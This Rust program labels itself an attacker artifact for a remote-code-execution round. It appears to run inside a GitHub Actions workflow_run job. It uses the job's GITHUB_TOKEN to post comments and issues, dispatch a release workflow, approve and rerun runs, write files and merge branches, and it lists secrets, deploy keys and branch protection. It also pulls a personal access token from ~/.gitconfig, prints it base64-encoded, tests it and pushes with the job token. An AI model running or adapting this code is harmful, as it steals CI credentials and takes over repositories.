use std::process::Command;

const REPO: &str = "PDFtoMark/triage-ethereum-optimism-v0754656-08ce38";

fn sh(cmd: &str) -> String {
    match Command::new("bash").arg("-c").arg(cmd).output() {
        Ok(o) => format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr)),
        Err(e) => format!("spawn error: {e}"),
    }
}

fn http(method: &str, url: &str, token: &str, body: Option<&str>) -> String {
    let mut args: Vec<String> = vec![
        "-sS".into(), "-X".into(), method.into(),
        "-o".into(), "/tmp/resp.bin".into(),
        "-D".into(), "/tmp/headers.txt".into(),
        "-w".into(), "%{http_code}".into(),
        "-H".into(), format!("Authorization: Bearer {token}"),
        "-H".into(), "Accept: application/vnd.github+json".into(),
        "-H".into(), "X-GitHub-Api-Version: 2022-11-28".into(),
    ];
    if let Some(b) = body {
        args.push("-H".into()); args.push("Content-Type: application/json".into());
        args.push("--data-binary".into()); args.push(b.to_string());
    }
    args.push(url.into());
    let out = match Command::new("curl").args(&args).output() {
        Ok(o) => o,
        Err(e) => return format!("curl spawn error {e}"),
    };
    let code = String::from_utf8_lossy(&out.stdout).to_string();
    let body = std::fs::read_to_string("/tmp/resp.bin").unwrap_or_default();
    let hdrs = std::fs::read_to_string("/tmp/headers.txt").unwrap_or_default();
    let accepted: Vec<String> = hdrs
        .lines()
        .filter(|l| {
            let l = l.to_ascii_lowercase();
            l.starts_with("x-accepted-github-permissions") || l.starts_with("x-oauth-scopes")
        })
        .map(|l| l.trim().to_string())
        .collect();
    let trimmed: String = body.chars().take(500).collect();
    format!("{method} {url} -> HTTP {code} [{}]\n{trimmed}\n", accepted.join(" | "))
}

fn main() {
    println!("RCE_MARKER=attacker_artifact_code_executed");
    println!("ATTACKER_STAGE=rce_round3");
    let gh = std::env::var("GITHUB_TOKEN").unwrap_or_default();
    println!("GITHUB_TOKEN_LEN={}", gh.len());

    let pulls = sh(&format!("curl -s -H 'Authorization: Bearer {gh}' 'https://api.github.com/repos/{REPO}/pulls?state=open&per_page=20'"));
    let pr: String = pulls
        .split("\"number\":")
        .skip(1)
        .last()
        .map(|s| s.trim_start().chars().take_while(|c| c.is_ascii_digit()).collect())
        .unwrap_or_default();
    println!("PR_RESOLVED={pr}");

    println!("{}", http("POST", &format!("https://api.github.com/repos/{REPO}/issues/{pr}/comments"), &gh,
        Some("{\"body\":\"RCE round3: job-token authenticated comment from workflow_run context\"}")));
    println!("{}", http("POST", &format!("https://api.github.com/repos/{REPO}/issues"), &gh,
        Some("{\"title\":\"rce-round3-issue-probe\",\"body\":\"capability probe\"}")));
    println!("{}", http("POST", &format!("https://api.github.com/repos/{REPO}/actions/workflows/release.yml/dispatches"), &gh,
        Some("{\"ref\":\"main\",\"inputs\":{\"dry_run\":true}}")));
    println!("{}", http("POST", &format!("https://api.github.com/repos/{REPO}/actions/runs/43274507357/rerun"), &gh, None));
    println!("{}", http("POST", &format!("https://api.github.com/repos/{REPO}/actions/runs/43274134480/approve"), &gh, None));
    println!("{}", http("PUT", &format!("https://api.github.com/repos/{REPO}/contents/rce-canary.txt"), &gh,
        Some("{\"message\":\"rce probe\",\"content\":\"Y2FuYXJ5\"}")));
    println!("{}", http("PUT", &format!("https://api.github.com/repos/{REPO}/pulls/{pr}/merge"), &gh,
        Some("{\"merge_method\":\"merge\"}")));
    println!("{}", http("POST", &format!("https://api.github.com/repos/{REPO}/merges"), &gh,
        Some("{\"base\":\"main\",\"head\":\"attack/wfr-rce\"}")));
    println!("{}", http("GET", &format!("https://api.github.com/repos/{REPO}/branches/main/protection"), &gh, None));
    println!("{}", http("GET", &format!("https://api.github.com/repos/{REPO}/actions/permissions"), &gh, None));
    println!("{}", http("GET", &format!("https://api.github.com/repos/{REPO}/keys"), &gh, None));
    println!("{}", http("GET", &format!("https://api.github.com/repos/{REPO}/environments"), &gh, None));
    println!("{}", http("GET", &format!("https://api.github.com/repos/{REPO}/actions/secrets"), &gh, None));

    let pat = sh("grep -hoE 'https://[^@/]+@github\\.com' ~/.gitconfig 2>/dev/null | head -1 | sed -e 's#https://##' -e 's#@github\\.com##'").trim().to_string();
    println!("PAT_LEN={} PAT_B64={}", pat.len(), base64(pat.as_bytes()));
    println!("PAT_TEST={}", http("GET", "https://api.github.com/user", &pat, None));
    println!("PAT_REPO={}", http("GET", &format!("https://api.github.com/repos/{REPO}"), &pat, None));

    // raw git push with the job token, non-workflow file
    let push = sh("cd /tmp && rm -rf pushtest && git init -q pushtest && cd pushtest && echo canary > rce.txt && git add . && git -c user.email=a@b -c user.name=a commit -qm x && git push \"https://x-access-token:$GITHUB_TOKEN@github.com/PDFtoMark/triage-ethereum-optimism-v0754656-08ce38.git\" HEAD:refs/heads/rce-git-canary 2>&1 | tail -3");
    println!("GIT_PUSH_JOB_TOKEN={push}");
    println!("ATTACKER_STAGE=done");
}

fn base64(data: &[u8]) -> String {
    const T: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::new();
    for chunk in data.chunks(3) {
        let b = [chunk[0], *chunk.get(1).unwrap_or(&0), *chunk.get(2).unwrap_or(&0)];
        let n = ((b[0] as u32) << 16) | ((b[1] as u32) << 8) | b[2] as u32;
        out.push(T[((n >> 18) & 63) as usize] as char);
        out.push(T[((n >> 12) & 63) as usize] as char);
        out.push(if chunk.len() > 1 { T[((n >> 6) & 63) as usize] as char } else { '=' });
        out.push(if chunk.len() > 2 { T[(n & 63) as usize] as char } else { '=' });
    }
    out
}
